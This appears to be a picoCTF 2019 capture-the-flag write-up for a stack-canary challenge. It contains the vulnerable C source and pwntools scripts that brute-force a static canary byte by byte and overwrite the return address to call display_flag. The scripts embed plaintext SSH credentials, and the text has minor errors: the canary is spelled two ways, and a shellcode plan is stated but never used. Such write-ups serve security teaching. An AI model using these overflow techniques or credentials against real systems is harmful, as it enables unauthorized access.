# Problem
This time we added a canary to detect buffer overflows. Can you still find a way to retreive the flag from this [program](https://2019shell1.picoctf.com/static/3b86c556e82a111455bdf574d9b3a9cf/vuln) located in /problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0. [Source](https://2019shell1.picoctf.com/static/3b86c556e82a111455bdf574d9b3a9cf/vuln.c).

## Hints:

Maybe there's a smart way to brute-force the canary?

## Solution:

Lets download the files:
```bash
wget https://2019shell1.picoctf.com/static/3b86c556e82a111455bdf574d9b3a9cf/vuln
wget https://2019shell1.picoctf.com/static/3b86c556e82a111455bdf574d9b3a9cf/vuln.c
```

First, we investigate the source
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUF_SIZE 32
#define FLAG_LEN 64
#define KEY_LEN 4

void display_flag() {
  char buf[FLAG_LEN];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }
  fgets(buf,FLAG_LEN,f);
  puts(buf);
  fflush(stdout);
}

char key[KEY_LEN];
void read_canary() {
  FILE *f = fopen("/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/canary.txt","r");
  if (f == NULL) {
    printf("[ERROR]: Trying to Read Canary\n");
    exit(0);
  }
  fread(key,sizeof(char),KEY_LEN,f);
  fclose(f);
}

void vuln(){
   char canary[KEY_LEN];
   char buf[BUF_SIZE];
   char user_len[BUF_SIZE];

   int count;
   int x = 0;
   memcpy(canary,key,KEY_LEN);
   printf("Please enter the length of the entry:\n> ");

   while (x<BUF_SIZE) {
      read(0,user_len+x,1);
      if (user_len[x]=='\n') break;
      x++;
   }
   sscanf(user_len,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,key,KEY_LEN)) {
      printf("*** Stack Smashing Detected *** : Canary Value Corrupt!\n");
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  int i;
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  read_canary();
  vuln();

  return 0;
}
```

We call ```buf```  with an offset of +- ```1``` to ```256```.

The strategy is to send a shellcode (with a [NOP sled](https://en.wikipedia.org/wiki/NOP_slide)).

Now lets write a simple python script:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = 'RoeeSefi'
pw = 'UTTE9CQN2idX28W'

canary = ''

if not debug:
  s = ssh(host = '2019shell1.picoctf.com', user=user, password=pw)

  s.set_working_directory('/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/')

while len(canary) < 4:
  for i in range(256):
    if debug:
      p = process('./vuln')
    else:
      p = s.process('./vuln')

    p.recvuntil('> ')
    p.sendline('{}'.format(32 + 1 + len(canary)))
    p.recvuntil('> ')
    p.sendline('A' * 32 + canary + '{}'.format(chr(i)))
    l = p.recvline()

    if '*** Stack Smashing Detected' not in l:
      canary += chr(i)

      log.info('Partial canary: {}'.format(canary))
      
      break

    p.close()

log.info('Found canary: {}'.format(canary))
```

And we found the canary: ```33x0```.

This this binary is have [PIE](https://access.redhat.com/blogs/766093/posts/1975793), the address of ```display_flag``` is randomed.
We need to randomize few bytes.

Let's debug and look at possible addresses:
```bash
gdb ./vuln

GNU gdb (Ubuntu 8.2.91.20190405-0ubuntu3) 8.2.91.20190405-git
Copyright (C) 2019 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./vuln...
(No debugging symbols found in ./vuln)
gdb-peda$ set disable-randomization off
gdb-peda$ b *main
Breakpoint 1 at 0xa05
gdb-peda$ r
Starting program: /home/roee/CTFs-Writeups/picoCTF-2019/Binary/09-canary-300/vuln 

Breakpoint 1, 0x5664ba05 in main ()
gdb-peda$ p display_flag 
$1 = {<text variable, no debug info>} 0x5664b7ed <display_flag>
gdb-peda$ r
Starting program: /home/roee/CTFs-Writeups/picoCTF-2019/Binary/09-canary-300/vuln 

Breakpoint 1, 0x56591a05 in main ()
gdb-peda$ p display_flag 
$2 = {<text variable, no debug info>} 0x565917ed <display_flag>
```

We can see that 3 bytes are being randomized. Let's use one of the addresses and execute it until we get the flag:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = 'RoeeSefi'
pw = 'UTTE9CQN2idX28W'

if debug:
  p = process('./vuln')
else:
  s = ssh(host = '2019shell1.picoctf.com', user=user, password=pw)
  s.set_working_directory('/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/')
  p = s.process('./vuln')

binary = ELF('./vuln')

canary = '33xO'

display_flag_randomized_address = 0x5664b7ed #binary.symbols['display_flag']

while True:
  print p.recvuntil('>')
  p.sendline('300')
  print p.recvuntil('>')
  p.sendline('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + canary + 'AAAABBBBCCCCDDDD' + p32(display_flag_randomized_address))
  flag = p.recvall()

  if 'pico' in flag:
    print flag

    break

  p.close()

  if debug:
    p = process('./vuln')
  else:
    p = s.process('./vuln')
```

finally we got it (well, probability of approx 16^(-3)):
```bash
 Input>
[x] Receiving all data
[x] Receiving all data: 1B
[x] Receiving all data: 72B
[+] Receiving all data: Done (72B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1326573)
 Ok... Now Where's the Flag?
picoCTF{cAnAr135_mU5t_b3_r4nd0m!_069c6f48}
```

*Probably there is a better way...*

Flag: picoCTF{cAnAr135_mU5t_b3_r4nd0m!_069c6f48}
